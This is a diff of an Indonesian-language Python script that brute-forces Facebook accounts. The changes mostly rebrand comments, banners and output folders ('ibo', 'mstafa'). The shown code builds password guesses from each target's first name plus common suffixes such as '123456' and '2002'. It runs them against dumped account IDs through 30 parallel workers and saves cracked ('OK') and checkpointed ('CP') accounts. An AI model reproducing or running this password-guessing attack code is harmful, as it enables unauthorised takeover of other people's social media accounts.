@@ -1,6 +1,6 @@
 #=[ Recode bolehðŸ™ƒ Tapi Sertakan Nama Gua yah ]=#
 
-#-----------------[ IMPORT-MODULE ]-------------------#
+#-----------------[ ibrahim-kawraban ]-------------------#
 import requests,bs4,json,os,sys,random,datetime,time,re
 import urllib3,rich,base64
 from rich.table import Table as me
@@ -17,7 +17,7 @@ from rich import pretty
 from rich.text import Text as tekz
 pretty.install()
 CON=sol()
-#------------------[ USER-AGENT ]-------------------#
+#------------------[ mstafa-AGENT ]-------------------#
 ugen2=[]
 ugen=[]
 cokbrut=[]
@@ -85,11 +85,11 @@ def uaku():
 		for un in aa:
 			ua.write(un+'\n')
 		ua=open('.bbnew.txt','r').read().splitlines()
-#------------[ INDICATION ]---------------#
+#------------[ iboka ]---------------#
 id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
 cokbrut=[]
 pwpluss,pwnya=[],[]
-#------------[ WARNA-COLOR ]--------------#
+#------------[ mstafa-COLOR ]--------------#
 P = '\x1b[1;97m'
 M = '\x1b[1;91m'
 H = '\x1b[1;92m'
@@ -125,7 +125,7 @@ def clear():
 	os.system('clear')
 def back():
 	login()
-#------------------[ LOGO-LAKNAT ]-----------------#
+#------------------[ iboka-LAKNAT ]-----------------#
 def banner():
 	clear()
 	alvino_xy(f'''\t{asu} ______                                              
@@ -134,8 +134,8 @@ def banner():
 \t  |  __'.[ `/'`\]`'_\ : [_   ] [_   ]/ /__\\[ `/'`\] 
 \t _| |__) || |    // | |, .' /_  .' /_| \__., | |     	
 \t|_______/[___]   \'-;__/[_____][_____]'.__.'[___]    	
-			{m}â€¢{k}â€¢{h}â€¢{sir} Author :   {x}{m}â€¢{k}â€¢{h}â€¢{x}''')
-#--------------------[ BAGIAN-MASUK ]--------------#
+			{I}â€¢{b}â€¢{o}â€¢{jokr} Author :   {x}{m}â€¢{k}â€¢{h}â€¢{x}''')
+#--------------------[ ibrahim-kawraban ]--------------#
 def login():
 	try:
 		token = open('.token.txt','r').read()
@@ -497,7 +497,7 @@ def grup1(urls):
 				lah()
 		except KeyboardInterrupt:
 			lah()
-#-------------[ CRACK-FROM-FILE ]------------------#
+#-------------[ CRACK-ibo-FILE ]------------------#
 def crack_file():
 	try:vin = os.listdir('DUMP')
 	except FileNotFoundError:
@@ -605,8 +605,8 @@ def setting():
 def passwrd():
 	print(f'>>>>> {m}â€¢{k}â€¢{h}â€¢{x} Sedang Menggeser Matahari {m}â€¢{k}â€¢{h}â€¢{x} <<<<< ')
 	print('')
-	print(f'>> Hasil {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
-	print(f'>> Hasil {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
+	print(f'>> Hasil {h}OK{x} Tersimpan Di : {h}ibo/%s {x}'%(okc))
+	print(f'>> Hasil {k}CP{x} Tersimpan Di : {k}ibo/%s {x}'%(cpc))
 	print(f'>> LA HAR 1K ID AIRPLANE BKARA ISH {m}1k{x} Idz\n')
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
@@ -624,11 +624,11 @@ def passwrd():
 					pwv.append(frs+'123456789')
 					pwv.append(frs+'1122')
 					pwv.append(frs+'2022')
-					pwv.append(frs+'2001')
+					pwv.append(frs+'ibo123')
 					pwv.append(frs+'2004')
 					pwv.append(frs+'2002')
-					pwv.append(frs+'2003')
-					pwv.append(frs+'1999')
+					pwv.append(frs+'1122334455')
+					pwv.append(frs+'123456')
 					pwv.append(frs+'1996')
 					pwv.append(frs+'1998')
 					pwv.append(frs+'1997')
@@ -676,8 +676,8 @@ def passwrd():
 				pool.submit(crackmbasic,idf,pwv)
 	print('')
 	cetak(nel('\t[cyan]>>[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan] <<[white] '))
-	print(f'[{b}GOOD¢{x}]{h} OK : {h}%s '%(ok))
-	print(f'{x}[{b}CP¢{x}]{k} CP : {k}%s{x} '%(cp))
+	print(f'[{b}GOOD¢{x}]{h} ibo : {h}%s '%(ok))
+	print(f'{x}[{b}CP¢{x}]{k} ibo : {k}%s{x} '%(cp))
 	print('')
 	print('>> CRACK DUBARA AKAITAWA ( Y/t ) ? ')
 	woi = input('>> CHOSE : ')
